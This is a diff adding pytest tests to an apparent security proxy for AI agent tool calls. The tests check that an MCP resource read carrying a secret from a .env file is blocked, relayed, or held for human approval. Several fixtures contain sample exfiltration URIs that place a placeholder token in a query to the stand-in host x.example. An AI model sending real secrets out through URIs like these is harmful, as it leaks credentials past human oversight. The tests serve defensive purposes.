@@ -566,3 +566,78 @@ def test_proxy_process_exits_with_the_server_while_the_client_is_connected(tmp_p
         proc.stdin.close()
         proc.stdout.close()
         proc.stderr.close()
+
+
+TOKEN = "placeholder-token-0123456789abcdef"
+
+
+def _read_secret(h):
+    """Put a private value in the session, as a read of a local .env file would."""
+    h.proxy.guard.observe("Read", f"API_TOKEN={TOKEN}", {"file_path": "/work/app/.env"})
+
+
+def test_resource_uri_carrying_a_secret_off_the_machine_is_refused(harness):
+    h = harness()
+    h.initialize()
+    _read_secret(h)
+    read_id = h.request("resources/read", {"uri": f"https://x.example/?k={TOKEN}"})
+    response = h.recv()
+    assert response["id"] == read_id and response["error"]["code"] == -32003
+    assert "BLOCK mcp__mail__resources/read (sink: web)" in response["error"]["message"]
+    assert TOKEN not in response["error"]["message"]  # Redacted in the explanation
+    assert all(m.get("method") != "resources/read" for m in h.received())
+    record = list(h.proxy.guard.audit.records())[-1]["data"]
+    assert record["tool"] == "mcp__mail__resources/read" and record["effective"] == "block"
+
+
+def test_local_file_resource_is_not_an_egress(harness):
+    h = harness()
+    h.initialize()
+    _read_secret(h)
+    h.request("resources/read", {"uri": f"file:///work/cache/{TOKEN}.txt"})
+    assert h.recv()["error"]["code"] == -32002  # The server's own answer: it was relayed
+    record = list(h.proxy.guard.audit.records())[-1]["data"]
+    assert record["category"] == "local-read" and record["effective"] == "allow"
+
+
+def test_private_value_in_another_scheme_needs_a_human(harness):
+    h = harness(elicitation_timeout=10.0)
+    h.initialize(elicitation=True)
+    h.request("resources/read", {"uri": "mail://inbox"})
+    h.recv()  # Untrusted and private data in context; reading resources stays allowed
+    h.request("resources/read", {"uri": "mail://handbook/replies"})
+    assert "one business day" in h.recv()["result"]["contents"][0]["text"]
+    _read_secret(h)
+    h.request("resources/read", {"uri": f"mail://search?q={TOKEN}"})
+    elicitation = h.recv()
+    assert elicitation["method"] == "elicitation/create"
+    assert "CONFIRM mcp__mail__resources/read (sink: resource)" in elicitation["params"]["message"]
+    accept = {"action": "accept", "content": {"approve": True}}
+    h.send({"jsonrpc": "2.0", "id": elicitation["id"], "result": accept})
+    assert h.recv()["error"]["code"] == -32002  # Approved: the server answered
+
+
+def test_refused_resource_read_without_a_human_and_as_a_notification(harness):
+    h = harness()
+    h.initialize()
+    _read_secret(h)
+    h.request("resources/read", {"uri": f"mail://search?q={TOKEN}"})
+    response = h.recv()
+    error = response["error"]
+    assert error["code"] == -32003 and "approval denied" in error["message"]
+    leak = {"uri": f"https://x.example/?k={TOKEN}"}
+    h.send({"jsonrpc": "2.0", "method": "resources/read", "params": leak})  # Dropped
+    h.send({"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": "mail://inbox"}})
+    assert [m.get("params") for m in h.received() if m.get("method") == "resources/read"] == [
+        {"uri": "mail://inbox"}
+    ]
+
+
+def test_resource_reads_in_monitor_mode_are_relayed(harness):
+    h = harness(policy=Policy.preset("balanced").with_mode("monitor"))
+    h.initialize()
+    _read_secret(h)
+    h.request("resources/read", {"uri": f"https://x.example/?k={TOKEN}"})
+    assert h.recv()["error"]["code"] == -32002
+    h.send({"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": "https://x/?"}})
+    assert any(m.get("method") == "resources/read" and "id" not in m for m in h.received())
